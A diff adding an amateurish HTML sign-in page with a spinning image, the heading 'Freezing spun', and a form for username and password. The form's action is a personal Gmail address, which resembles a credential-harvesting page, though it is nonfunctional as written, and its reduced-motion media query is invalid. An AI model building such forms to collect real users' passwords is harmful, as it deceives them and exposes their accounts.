@@ -1,1 +1,42 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in</title>
+    <style>
+    /* Put this CSS in your existing stylesheet if you prefer */
+    .rotating {
+      display: inline-block;            /* keep transform behavior consistent */
+      transform-origin: 50% 50%;        /* rotate around center */
+      --rotation-duration: 3s;          /* change to speed up/slow down */
+      animation: spin var(--rotation-duration) linear infinite;
+      will-change: transform;
+      cursor: pointer;
+    }
 
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    /* If you want to respect users' reduced-motion preference */
+    @media (prefers-reduced-motion: single-animation) {
+      .rotating { animation: none !important; }
+    }
+ 
+</style>             
+</head>
+<body>
+    <center class="freezer"><img class="rotating"  src="freezer.webp" alt="freezing sign" width="200px" height="200px">
+    <h1>Freezing spun</h1></center>                               
+    <center><form action="untoldbillionaire@gmail.com" method="post">
+        Log in with username/ e-mail/phone:
+        <input type="text" id="username/ e-mail/phone" name="username/ e-mail/phone" required="required"><br><br>
+  <br>  
+        Password:
+        <input type="password" id="password" name="password" required="required"><br><br>
+        <input type="submit" value="Sign In">
+    </form></center>
+</body>
+
+</html>
